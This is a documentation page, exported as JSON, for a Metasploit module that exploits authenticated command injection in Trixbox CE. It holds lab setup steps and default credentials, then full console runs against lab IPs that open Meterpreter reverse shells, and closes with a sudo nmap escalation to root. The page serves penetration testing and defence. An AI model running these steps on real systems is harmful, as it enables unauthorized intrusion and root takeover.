{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce","result":{"data":{"moduleMetadataJson":{"id":"f9bfd358-58d6-5f35-9ad4-3b851137f031","name":"TrixBox CE endpoint_devicemap.php Authenticated Command Execution","fullname":"exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce","description":"This module exploits an authenticated OS command injection\n          vulnerability found in Trixbox CE version 1.2.0 to 2.8.0.4\n          inclusive in the \"network\" POST parameter of the\n          \"/maint/modules/endpointcfg/endpoint_devicemap.php\" page.\n          Successful exploitation allows for arbitrary command execution\n          on the underlying operating system as the \"asterisk\" user.\n          Users can easily elevate their privileges to the \"root\" user\n          however by executing \"sudo nmap --interactive\" followed by \"!sh\"\n          from within nmap.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce","documentationSlug":"/modules/documentation/exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce","referencesSlug":"/modules/references/exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>  This module exploits an authenticated OS command injection\nvulnerability found in Trixbox CE version 1.2.0 to 2.8.0.4\ninclusive in the \"network\" POST parameter of the\n\"/maint/modules/endpointcfg/endpoint_devicemap.php\" page.\nSuccessful exploitation allows for arbitrary command execution\non the underlying operating system as the \"asterisk\" user.\nUsers can easily elevate their privileges to the \"root\" user\nhowever by executing \"sudo nmap --interactive\" followed by \"!sh\"\nfrom within nmap.</p>\n<h3 id=\"installation-and-setup\" style=\"position:relative;\"><a href=\"#installation-and-setup\" aria-label=\"installation and setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Installation And Setup</h3>\n<ol>\n<li>Download the latest version of Trixbox CE (i.e. <a href=\"https://netcologne.dl.sourceforge.net/project/asteriskathome/trixbox%20CE/trixbox%202.8/trixbox-2.8.0.4.iso\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">v2.8.0.4 ISO</a>).</li>\n<li>\n<p>Set up a new CentOS machine in VirtualBox or VMWare and load the ISO.\nBe sure to disable any autosetup features of VMWare or VirtualBox.\nFollow the install prompts and note the <code class=\"language-text\">root</code> password you choose to use.\nOnce <code class=\"language-text\">Package Installation</code> appears on the screen, wait for the system\nto finish rebooting several times, after which the following screen\nshould be displayed:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">CentOS release 4.3 (Final)\nKernel 2.6.9-34.EL on an i686</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n</li>\n</ol>\n<p>  asterisk1 login:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">3. Log into via the terminal using the username `root` and the password \nyou set for the `root` user during installation.\n4. A prompt similar to the following should be displayed:</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>  For access to the trixbox web GUI use this URL: <a href=\"http://192.168.205.144\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://192.168.205.144</a></p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">5. Once this prompt is displayed, take the IP address and browse \nto the URL http://*IP ADDRESS*/maint/, then log in with the default \nadministrative credentials (`maint`:`password`).\n\n## Verification Steps\n\nFollow [Setup](#setup) and [Scenarios](#scenarios).\n\n## Scenarios\n\n### Trixbox CE v2.8.0.4</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>msf5 > use exploit/unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > set rhosts 192.168.1.8\nrhosts => 192.168.1.8\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > show options</p>\n<p>Module options (exploit/unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce):</p>\n<p>   Name          Current Setting  Required  Description</p>\n<hr>\n<p>   HttpPassword  password         yes       Password to login with\nHttpUsername  maint            yes       User to login with\nProxies                        no        A proxy chain of format type:host:port[,type:host:port][...]\nRHOSTS        192.168.1.8      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT         80               yes       The target port (TCP)\nSRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\nSRVPORT       8080             yes       The local port to listen on.\nSSL           false            no        Negotiate SSL/TLS for outgoing connections\nSSLCert                        no        Path to a custom SSL certificate (default is randomly generated)\nURIPATH                        no        The URI to use for this exploit (default is random)\nVHOST                          no        HTTP server virtual host</p>\n<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>\n<p>   Name   Current Setting  Required  Description</p>\n<hr>\n<p>   LHOST                   yes       The listen address (an interface may be specified)\nLPORT  4444             yes       The listen port</p>\n<p>Exploit target:</p>\n<p>   Id  Name</p>\n<hr>\n<p>   0   Automatic (Linux Dropper)</p>\n<p>msf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > set lhost 192.168.1.10\nlhost => 192.168.1.10\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > exploit</p>\n<p>[*] Started reverse TCP handler on 192.168.1.10:4444\n[*] 192.168.1.8:80 - Authenticating using \"maint:password\" credentials...\n[+] 192.168.1.8:80 - Authenticated successfully.\n[+] 192.168.1.8:80 - Trixbox CE v2.8.0.4 identified.\n[*] 192.168.1.8:80 - Sending payload (150 bytes)...\n[*] Sending stage (980808 bytes) to 192.168.1.8\n[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.8:38680) at 2020-05-02 03:55:24 -0400\n[*] Command Stager progress - 100.00% done (799/799 bytes)</p>\n<p>meterpreter > sysinfo\nComputer     : trixbox1.localdomain\nOS           : CentOS 5.5 (Linux 2.6.18-164.11.1.el5)\nArchitecture : i686\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter > shell\nProcess 9259 created.\nChannel 1 created.\nid\nuid=100(asterisk) gid=101(asterisk) groups=101(asterisk)\nwhoami\nasterisk</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">### Trixbox CE v2.4.0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>msf5 > use exploit/unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > set rhosts 192.168.1.7\nrhosts => 192.168.1.7\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > show options</p>\n<p>Module options (exploit/unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce):</p>\n<p>   Name          Current Setting  Required  Description</p>\n<hr>\n<p>   HttpPassword  password         yes       Password to login with\nHttpUsername  maint            yes       User to login with\nProxies                        no        A proxy chain of format type:host:port[,type:host:port][...]\nRHOSTS        192.168.1.7      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT         80               yes       The target port (TCP)\nSRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\nSRVPORT       8080             yes       The local port to listen on.\nSSL           false            no        Negotiate SSL/TLS for outgoing connections\nSSLCert                        no        Path to a custom SSL certificate (default is randomly generated)\nURIPATH                        no        The URI to use for this exploit (default is random)\nVHOST                          no        HTTP server virtual host</p>\n<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>\n<p>   Name   Current Setting  Required  Description</p>\n<hr>\n<p>   LHOST                   yes       The listen address (an interface may be specified)\nLPORT  4444             yes       The listen port</p>\n<p>Exploit target:</p>\n<p>   Id  Name</p>\n<hr>\n<p>   0   Automatic (Linux Dropper)</p>\n<p>msf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > set lhost 192.168.1.10\nlhost => 192.168.1.10\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > exploit</p>\n<p>[*] Started reverse TCP handler on 192.168.1.10:4444\n[*] 192.168.1.7:80 - Authenticating using \"maint:password\" credentials...\n[+] 192.168.1.7:80 - Authenticated successfully.\n[+] 192.168.1.7:80 - Trixbox CE v2.4.0 identified.\n[*] 192.168.1.7:80 - Sending payload (150 bytes)...\n[*] Sending stage (980808 bytes) to 192.168.1.7\n[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.7:4478) at 2020-05-02 03:52:53 -0400\n[*] Command Stager progress - 100.00% done (799/799 bytes)</p>\n<p>meterpreter > sysinfo\nComputer     : trixbox1.localdomain\nOS           : CentOS 5 (Linux 2.6.18-53.1.4.el5)\nArchitecture : i686\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter > shell\nProcess 14144 created.\nChannel 1 created.\nid\nuid=100(asterisk) gid=101(asterisk) groups=101(asterisk)\nwhoami\nasterisk</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">### Trixbox CE v1.2.0</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>msf5 > use exploit/unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > show options</p>\n<p>Module options (exploit/unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce):</p>\n<p>   Name          Current Setting  Required  Description</p>\n<hr>\n<p>   HttpPassword  password         yes       Password to login with\nHttpUsername  maint            yes       User to login with\nProxies                        no        A proxy chain of format type:host:port[,type:host:port][...]\nRHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\nRPORT         80               yes       The target port (TCP)\nSRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\nSRVPORT       8080             yes       The local port to listen on.\nSSL           false            no        Negotiate SSL/TLS for outgoing connections\nSSLCert                        no        Path to a custom SSL certificate (default is randomly generated)\nURIPATH                        no        The URI to use for this exploit (default is random)\nVHOST                          no        HTTP server virtual host</p>\n<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>\n<p>   Name   Current Setting  Required  Description</p>\n<hr>\n<p>   LHOST                   yes       The listen address (an interface may be specified)\nLPORT  4444             yes       The listen port</p>\n<p>Exploit target:</p>\n<p>   Id  Name</p>\n<hr>\n<p>   0   Automatic (Linux Dropper)</p>\n<p>msf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > set LHOST 192.168.205.1\nLHOST => 192.168.205.1\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > set SRVHOST 192.168.205.1\nSRVHOST => 192.168.205.1\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > set RHOSTS 192.168.205.148\nRHOSTS => 192.168.205.148\nmsf5 exploit(unix/webapp/trixbox<em>ce</em>endpoint<em>devicemap</em>rce) > exploit</p>\n<p>[*] Started reverse TCP handler on 192.168.205.1:4444\n[*] 192.168.205.148:80 - Authenticating using \"maint:password\" credentials...\n[+] 192.168.205.148:80 - Authenticated successfully.\n[+] 192.168.205.148:80 - Trixbox CE v1.2.0 identified.\n[*] 192.168.205.148:80 - Sending payload (150 bytes)...\n[*] Sending stage (980808 bytes) to 192.168.205.148\n[*] Meterpreter session 1 opened (192.168.205.1:4444 -> 192.168.205.148:32775) at 2020-05-04 12:53:23 -0500\n[*] Command Stager progress - 100.00% done (799/799 bytes)</p>\n<p>meterpreter > sysinfo\nComputer     : asterisk1.local\nOS           : CentOS 4.4 (Linux 2.6.9-42.0.2.EL)\nArchitecture : i686\nBuildTuple   : i486-linux-musl\nMeterpreter  : x86/linux\nmeterpreter > shell\nProcess 5678 created.\nChannel 1 created.\nid\nuid=100(asterisk) gid=101(asterisk) groups=101(asterisk)\nwhoami\nasterisk</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">## Privilege Elevation Steps\n\n  Once a shell has been gained as the `asterisk` user, \n  attackers can elevate their privileges to `root` by \n  executing the following commands:</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>sudo nmap --interactive</p>\n<p>Starting Nmap V. 4.76 ( <a href=\"http://nmap.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">http://nmap.org</a> )\nWelcome to Interactive Mode -- press h <enter> for help\nnmap> !sh\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\"></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"></span></pre></div>"}}},"pageContext":{"id":"f9bfd358-58d6-5f35-9ad4-3b851137f031"}}}